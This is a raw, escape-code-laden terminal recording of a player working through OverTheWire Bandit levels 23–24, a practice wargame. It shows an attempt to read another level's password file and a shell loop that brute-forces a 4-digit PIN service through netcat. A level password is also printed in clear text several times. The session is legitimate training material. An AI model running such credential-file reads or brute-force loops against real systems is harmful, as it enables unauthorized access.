+[C[C[A]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctmp[1P/tmp.2rGGaID5HN[A]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[A
+[?2004l-bash: /tmp/tmp.2rGGaID5HN: Is a directory
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat /etc/bandit_pass/bandit24 > /tmp/tmp.2rGGaID5HN/l
+[?2004lcat: /etc/bandit_pass/bandit24: Permission denied
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit23@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[1P [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C4@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit24@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ ls
+[?2004l[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ nc localhost 30002
+[?2004lI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+Wrong! Please enter the correct current password and pincode. Try again.
+^C
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ nano script 
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;20H(B[0;1m[37m[41m[ Directory '.' is not writable ][39;49m(B[m[H(B[0;7m  GNU nano 7.2                     script                               [1;71H(B[m[29;20H  (B[0;1m[37m[41m[ Problems with history file ][39;49m(B[m[K[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[?12l[?25h[?25l[1;43H(B[0;7m*[71G(B[m[?12l[?25h[2d[36m#[39m(B[m[?25l[?12l[?25h[36m1[39m(B[m[?25l[?12l[?25h [?25l[?12l[?25h[36m![39m(B[m[?25l[?12l[?25h[36m/[39m(B[m[?25l[?12l[?25h[36mb[39m(B[m[?25l[?12l[?25h[36mi[39m(B[m[?25l[?12l[?25h[36mn[39m(B[m[?25l[?12l[?25h[36m/[39m(B[m[?25l[?12l[?25h[36ms[39m(B[m[?25l[?12l[?25h[36mh[39m(B[m[?25l[3d[?12l[?25h[?25l[?12l[?25hf[?25l[?12l[?25ho[?25l[?12l[?25hr[?25l[?12l[?25h [?25l[?12l[?25hi[?25l[?12l[?25h [?25l[?12l[?25hi[?25l[29d[K[?12l[?25h[3;8Hn[?25l[?12l[?25h [?25l[?12l[?25hs[?25l[?12l[?25he[?25l[?12l[?25hq[?25l[?12l[?25h{[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h.[?25l[?12l[?25h.[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h{[?25l[?12l[?25h [?25l[?12l[?25h}[?25l[4d[?12l[?25h[?25l[?12l[?25hd[?25l[?12l[?25ho[?25l[?12l[?25h[?25l[?12l[?25h[3;25H[?25l[?12l[?25h;[?25l[?12l[?25h [?25l[?12l[?25h:[?25l[?12l[?25h[2;10H[?25l[?12l[?25h[3d[?25l[?12l[?25h[2;10H[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h[36mp[39m(B[m[?25l[?12l[?25h[36my[39m(B[m[?25l[?12l[?25h[36mt[39m(B[m[?25l[?12l[?25h[36mh[39m(B[m[?25l[?12l[?25h[36mo[39m(B[m[?25l[?12l[?25h[36mn[39m(B[m[?25l[?12l[?25h[8G[?25l[?12l[?25h[?25l[?12l[?25h[36mubin/python[5G[39m(B[m[?25l[?12l[?25h[36msbin/python[6G[39m(B[m[?25l[?12l[?25h[36mrbin/python[7G[39m(B[m[?25l[?12l[?25h[36m/bin/python[8G[39m(B[m[?25l[?12l[?25h[3d[?25l[?12l[?25hn [?25l[?12l[?25hseq{[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25hr0000..9999}:[3;11H[?25l[?12l[?25ha0000..9999}:[3;12H[?25l[?12l[?25hn0000..9999}:[3;13H[?25l[?12l[?25hg0000..9999}:[3;14H[?25l[?12l[?25he0000..9999}:[3;15H[?25l[?12l[?25h(0000..9999}:[3;16H[?25l[6P[?12l[?25h[?25l[K[?12l[?25h[?25ldo[4d[K[3;16H[?12l[?25h[?25l[K[?12l[?25h[?25l[?12l[?25h1[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h[16G[?25l[?12l[?25h010000[17G[?25l[?12l[?25h0010000[18G[?25l[?12l[?25h00010000[19G[?25l[?12l[?25h000010000[20G[?25l[?12l[?25h-10000[21G[?25l[?12l[?25h10000[K[20G[?25l[?12l[?25h[1P000[?25l[?12l[?25h[1P00[?25l[?12l[?25h[1P0[?25l[?12l[?25h10000[K[16G[?25l[?12l[?25h10000[K[15G[?25l[?12l[?25h(10000[16G[?25l[?12l[?25h[4d[?25l[?12l[?25h[3;21H[?25l[?12l[?25h)[?25l[?12l[?25h:[?25l[4d[?12l[?25h[?25l[?12l[?25h[8G[38;5;208m[1K [39m(B[m[?25l[?12l[?25hp[?25l[?12l[?25hr[?25l[?12l[?25hi[?25l[?12l[?25hn[?25l[?12l[?25ht[?25l[?12l[?25h([?25l[?12l[?25h"[?25lgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8[?12l[?25h[?25l[?12l[?25h"[?25l[?12l[?25h [?25l[?12l[?25h+[?25l[?12l[?25h [?25l[?12l[?25h"[?25l[?12l[?25h [?25l[?12l[?25h"[?25l[?12l[?25h [?25l[?12l[?25h+[?25l[?12l[?25h"[?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h([?25l[?12l[?25hf[?25l[?12l[?25h"[?25lgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h{[?25l[?12l[?25hi[?25l[?12l[?25h}[?25l[?12l[?25h'[?25l[?12l[?25h)[?25l[5d[?12l[?25h[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^G(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: script(B[m[?12l[?25h[?25l[29;14H[1K (B[0;1m[37m[41m[ Error writing script: Permission denied ][39;49m(B[m[K[30;15H(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[55G  (B[0;7m^T(B[m Execute[K[31;2H(B[0;7mX(B[m Exit       (B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste      (B[0;7m^J(B[m Justify[?12l[?25h[5d[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004lUnable to create directory /home/bandit24/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ mktemp =[K-p
+[?2004lmktemp: option requires an argument -- 'p'
+Try 'mktemp --help' for more information.
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ mktemp -p[Kd
+[?2004l/tmp/tmp.HtdhT3U9bB
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ cd [7m/tmp/tmp.HtdhT3U9bB[27m/tmp/tmp.HtdhT3U9bB
+[?2004l[?2004h]0;bandit24@bandit: /tmp/tmp.HtdhT3U9bB[01;32mbandit24@bandit[00m:[01;34m/tmp/tmp.HtdhT3U9bB[00m$ touch l.sh
+[?2004l[?2004h]0;bandit24@bandit: /tmp/tmp.HtdhT3U9bB[01;32mbandit24@bandit[00m:[01;34m/tmp/tmp.HtdhT3U9bB[00m$ nano l.py
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;31H(B[0;7m[ New File ](B[m[H(B[0;7m  GNU nano 7.2                      l.py                                [1;71H(B[m[29;22H(B[0;1m[37m[41m[ Problems with history file ][39;49m(B[m[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[?12l[?25h[?25l[1;42H(B[0;7m*[71G(B[m[?12l[?25h[2d(B[0;1m[31m#[39m(B[m[?25l[?12l[?25h(B[0;1m[31m![39m(B[m[?25l[?12l[?25h(B[0;1m[31m/[39m(B[m[?25l[?12l[?25h(B[0;1m[31mu[39m(B[m[?25l[?12l[?25h(B[0;1m[31ms[39m(B[m[?25l[?12l[?25h(B[0;1m[31mr[39m(B[m[?25l[?12l[?25h(B[0;1m[31m.[39m(B[m[?25l[?12l[?25h [?25l[?12l[?25h(B[0;1m[31m/[39m(B[m[?25l[?12l[?25h(B[0;1m[31mb[39m(B[m[?25l[?12l[?25h(B[0;1m[31mi[39m(B[m[?25l[?12l[?25h(B[0;1m[31mn[39m(B[m[?25l[?12l[?25h(B[0;1m[31m/[39m(B[m[?25l[?12l[?25h(B[0;1m[31mp[39m(B[m[?25l[?12l[?25h(B[0;1m[31my[39m(B[m[?25l[?12l[?25h(B[0;1m[31mt[39m(B[m[?25l[?12l[?25h(B[0;1m[31mh[39m(B[m[?25l[?12l[?25h(B[0;1m[31mo[39m(B[m[?25l[?12l[?25h(B[0;1m[31mn[39m(B[m[?25l[29d[K[?12l[?25h[2;18H(B[0;1m[31m3[39m(B[m[?25l[3d[?12l[?25h[?25l[?12l[?25hf[?25l[?12l[?25ho[?25l[?12l[?25h(B[0;1m[36mfor[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h i[?25l[?12l[?25hi[?25l[?12l[?25h [?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h i[?25l[?12l[?25h(B[0;1m[36min[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h r[?25l[?12l[?25ha[?25l[?12l[?25hn[?25l[?12l[?25hg[?25l[?12l[?25he[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h [?25l[?12l[?25h([?25l[?12l[?25h1[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h)[?25l[29;26H(B[0;1m[37m[41m[ Cutbuffer is empty ][39;49m(B[m[?12l[?25h[3;22H[?25l[?12l[?25h[?25l[K[29d[K[3d[?12l[?25h[?25l[?12l[?25h[A[?25l[?12l[?25h[4G[?25l[?12l[?25h[8G[?25l[K[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h(B[0;1m[31m#[39m(B[m[?25l[?12l[?25h(B[0;1m[31m![39m(B[m[?25l[?12l[?25h(B[0;1m[31m/[39m(B[m[?25l[?12l[?25h(B[0;1m[31mb[39m(B[m[?25l[?12l[?25h(B[0;1m[31mi[39m(B[m[?25l[?12l[?25h(B[0;1m[31mn[39m(B[m[?25l[?12l[?25h(B[0;1m[31m/[39m(B[m[?25l[?12l[?25h(B[0;1m[31ms[39m(B[m[?25l[?12l[?25h(B[0;1m[31mh[39m(B[m[?25l[3d[?12l[?25h[?25l[?12l[?25hf[?25l[?12l[?25ho[?25l[29d[?12l[?25h[3d(B[0;1m[36mfor[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h i[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h i[?25l[?12l[?25h(B[0;1m[36min[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h s[?25l[?12l[?25he[?25l[?12l[?25hq[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h[42m [49m(B[m[K[?25l[?12l[?25h [?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h {[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h.[?25l[?12l[?25h.[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h9[?25l[?12l[?25h}[?25l[4d[?12l[?25h[?25l[?12l[?25hd[?25l[?12l[?25ho[?25l[?12l[?25h[42m [49m(B[m[?25l[5d[?12l[?25h[?25l[?12l[?25h[8G[42m[1K [49m(B[m[?25l[?12l[?25h[1K ec[?25l[?12l[?25hh[?25l[?12l[?25ho[?25l[?12l[?25h[42m [49m(B[m[?25l gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8[?12l[?25h[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h $[?25l[?12l[?25hi[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h  >[?25l[?12l[?25h>[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h l[?25l[?12l[?25hp[?25l[6d[?12l[?25h[?25l[?12l[?25hd[?25l[?12l[?25ho[?25l[?12l[?25hn[?25l[?12l[?25he[?25l[?12l[?25h[42m [49m(B[m[?25l[7d[?12l[?25h[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[29G[1K (B[0;7m[ Cancelled ](B[m[K[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[?12l[?25h[7d[?25l[8d[?12l[?25h[?25l[?12l[?25hc[?25l[?12l[?25ha[?25l[?12l[?25ht[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h l[?25l[?12l[?25hp[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h [?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h |[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h n[?25l[?12l[?25hc[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h l[?25l[?12l[?25ho[?25l[?12l[?25hc[?25l[?12l[?25ha[?25l[29d[K[?12l[?25h[8;17Hl[?25l[?12l[?25h[42m       [49m(B[m[?25l[?12l[?25h[18G[K[?25l[?12l[?25hh[?25l[?12l[?25ho[?25l[?12l[?25hs[?25l[?12l[?25ht[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h 3[?25l[?12l[?25h1[?25l[?12l[?25h [?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h0[?25l[?12l[?25h2[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h >[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h r[?25l[?12l[?25he[?25l[?12l[?25hs[?25l[?12l[?25hu[?25l[?12l[?25hl[?25l[?12l[?25ht[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h[31G[?25l[?12l[?25h[?25l[?12l[?25h>> result[42m [8;31H[49m(B[m[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^G(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: l.py(B[m[?12l[?25h[?25l    [1K (B[0;7m[ Writing... ](B[m[K[1;42H(B[0;7m [71G(B[m[29;28H(B[0;7m[ Wrote 7 lines ](B[m[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004lUnable to create directory /home/bandit24/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+[?2004h]0;bandit24@bandit: /tmp/tmp.HtdhT3U9bB[01;32mbandit24@bandit[00m:[01;34m/tmp/tmp.HtdhT3U9bB[00m$ client_loop: send disconnect: Broken pipe
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit24@bandit.labs.overthewire.org -p 2220 [7mgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8[27m[C[C[C[K
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit24@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [7mgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+[?2004lgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8: command not found
+[?2004h]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m$ [K]0;bandit24@bandit: ~[01;32mbandit24@bandit[00m:[01;34m~[00m
